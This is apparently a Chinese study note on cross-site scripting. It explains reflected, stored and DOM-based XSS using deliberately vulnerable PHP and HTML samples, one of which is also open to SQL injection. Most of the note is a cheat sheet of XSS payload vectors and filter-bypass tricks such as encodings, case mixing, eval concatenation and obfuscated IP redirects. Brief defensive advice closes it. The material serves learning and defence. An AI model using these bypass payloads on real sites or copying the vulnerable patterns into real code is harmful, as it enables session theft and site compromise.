---
title: "XSS学习"
data: 2019-11-16 03:33
---

[TOC]

# xss基础
XSS 跨站脚本攻击 是一种**代码注入**  
XSS攻击分为三种：反射型、存储型、DOM型

# xss漏洞原理

## 反射型XSS
反射型又称非持久型XSS，攻击往往具有一次性  
攻击方式步骤： 

- 将包含xss代码发给目标用户
- 用户访问连接，对服务器发起请求
- 服务器响应将含有xss代码的数据返回目标用户浏览器
- 浏览器解析xss恶意代码，触发xss漏洞

## 存储型XSS
存储型又称持久型

## DOM型XSS
一种特殊的反射型XSS，基于DOM文档对对象模型的漏洞  
特点：  

- 通过js脚本通过DOM动态修改页面内容
- 发生在客户端，不与服务器交互
攻击方式：

- 专门设计包含xss代码的URL
- 由攻击者提交
- 服务器的响应不以任何形式包含攻击者脚本
- 当用户浏览器处理响应，DOM对象处理xss代码
- 触发xss漏洞

[DOM型xss剖析](https://blog.csdn.net/Bul1et/article/details/85091020)

# 环境
```
.
├── xss1.php
├── xss2.php
└── xss3.php
```

# 反射型XSS
## 示例
code/source/XSS/xss1.php  
关键代码：
```php
<?php
		if (isset($_GET['xss_input_value'])) {
			echo '<input type="text" value="'.$_GET['xss_input_value'].'">';
		}else{
			echo '<input type="text" value="输出">';
		}
	?>
```
构造payload
```
xss_input_value="><img src=1 onerror=alert(xss)/>
```
## 分析
payload发生步骤

- 通过GET传参xss_input_value值
- 拼接成`<input type="text" value=""><img src=1 onerror=alert(xss)/>">`
- echo输出img标签 触发xss

# 存储型xss攻击
## 示例
code/source/xss/xss2.php  
关键代码：
```php
<?php
	$con=mysqli_connect("localhost","root","root","test");
	if (mysqli_connect_errno())
	{
		echo "连接失败: " . mysqli_connect_error();
	}
	if (isset($_POST['title'])) {
		$result1 = mysqli_query($con,"insert into xss(`title`, `content`) VALUES ('".$_POST['title']."','".$_POST['content']."')");
	}
	$result2 = mysqli_query($con,"select * from xss");
	echo "<table border='1'><tr><td>标题</td><td>内容</td></tr>";
	while($row = mysqli_fetch_array($result2))
	{
		echo "<tr><td>".$row['title'] . "</td><td>" . $row['content']."</td>";
	}
	echo "</table>";
?>
```
构造payload
```
<img src=1 onerror=alert("xss") />
```
## 分析

- 通过post传参将title与content值写入数据库
- 通过echo输出img标签 出发payload

# DOM型xss
注：DOM型xss不通过服务器响应，仅在本地执行  
## 示例
code/source/xss/xss3.php  
关键代码：
```html
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
	<title>Test</title>
	<script type="text/javascript">
		function tihuan(){
			document.getElementById("id1").innerHTML = document.getElementById("dom_input").value;
		}
	</script>
</head>
<body>
	<center>
	<h3 id="id1">这里会显示输入的内容</h3>
	<form action="" method="post">
		<input type="text" id="dom_input" value="输入"><br />
		<input type="button" value="替换" onclick="tihuan()">
	</form>
	<hr>
	
	</center>
</body>
</html>
```
同样payload
```
<img src=1 onerror=alert("xss") />
```
## 分析
DOM型仅在本地执行所以没有服务器代码

- 同过post传参提交参数（xss代码）
- js脚本替换元素信息并执行xss代码

# xss常用语句及绕过
参考：  
https://xz.aliyun.com/t/4067  
https://xz.aliyun.com/t/2936
## 常用标签
```html
<scirpt>
<scirpt>alert("xss");</script>
<img>
<img src=1 onerror=alert("xss");>
<input>
<input onfocus="alert('xss');">
竞争焦点，从而触发onblur事件
<input onblur=alert("xss") autofocus><input autofocus>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<input onfocus="alert('xss');" autofocus>
<details>
<details ontoggle="alert('xss');">
使用open属性触发ontoggle事件，无需用户去触发
<details open ontoggle="alert('xss');">
<svg>
<svg onload=alert("xss");>
<select>
<select onfocus=alert(1)></select>
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<select onfocus=alert(1) autofocus>
<iframe>
<iframe onload=alert("xss");></iframe>
<video>
<video><source onerror="alert(1)">
<audio>
<audio src=x  onerror=alert("xss");>
<body>
<body/onload=alert("xss");>
利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发

<body
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<textarea>
<textarea onfocus=alert("xss"); autofocus>
<keygen>
<keygen autofocus onfocus=alert(1)> //仅限火狐
<marquee>
<marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以
<isindex>
<isindex type=image src=1 onerror=alert("xss")>//仅限于IE

利用link远程包含js文件
PS：在无CSP的情况下才可以
<link rel=import href="http://127.0.0.1/1.js">
javascript伪协议
<a>标签

<a href="javascript:alert(`xss`);">xss</a>
<iframe>标签

<iframe src=javascript:alert('xss');></iframe>
<img>标签

<img src=javascript:alert('xss')>//IE7以下
<form>标签

<form action="Javascript:alert(1)"><input type=submit>
```

## 过滤空格
用`/`代替空格
```
<img/src="x"/onerror=alert("xss");>
```

## 过滤关键字
### 大小写绕过
```
<ImG sRc=x onerRor=alert("xss");>
```
### 双写关键字
```
<imimgg srsrcc=x onerror=alert("xss");>
```

### 字符拼接
利用eval
```
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
```
利用top
```
<script>top["al"+"ert"](`xss`);</script>
```

### 其它字符混淆
waf利用正则检测是否存在xss攻击 我们则要fuzz出正则规则  
简单例子:
```
可利用注释、标签的优先级等
1.<<script>alert("xss");//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```
### 编码绕过
#### HTML实体编码

- 命名实体 `&lt;`为`<`
- 字符编码 `&#数值`
#### URL编码
使用全编码即两次编码
如alert的url全编码为`%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34`

#### JS编码
JS提供了四种字符编码的策略，

- 三个八进制数字，如果数字不够，在前面补零，如a的编码为\141
- 两个十六进制数字，如果数字不够，在前面补零，如a的编码为\x61
- 四个十六进制数字，如果数字不够，在前面补零，如a的编码为\u0061
- 对于一些控制字符，使用特殊的C类型的转义风格，如\n和\r

#### String.fromCharCode编码
如alert的编码为String.fromCharCode(97,108,101,114,116)

#### base
```
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">  
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```
## 过滤单引号双引号
### 反引号绕过
如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号
```
<img src="x" onerror=alert(`xss`);>
```
### 编码
同关键字编码绕过

## 过滤括号
当括号被过滤的时候可以使用throw来绕过
```
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```
## 过滤url地址
### URL编码
不再赘述

### 使用IP
IP地址进制转换：  
例如127.0.0.1 先转化成十六进制`7F000001`在转换成其他进制  
- 十进制IP
```
<img src="x" onerror=document.location=`http://2130706433/`>
```
- 八进制IP
```
<img src="x" onerror=document.location=`http://0177.0.0.01/`>
```
- 十六进制
```
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
```
- html标签使用`//`可以代替`http://`
```
<img src="x" onerror=document.location=`//www.baidu.com`>
```
- 使用`\\` 在linux下可代替`http://`
```
\\www.baidu.com 
\\E:/code/xxx.txt 在windows为file协议读取文件
```
### 使用中文句号代替英文句号
`。`会被浏览器转化为`.`
```
<img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
```

# 防止xss

- 过滤一些危险字符，以及转义& < > " ' /等危险字符
- HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。
- 设置CSP(Content Security Policy)
- 输入内容长度限制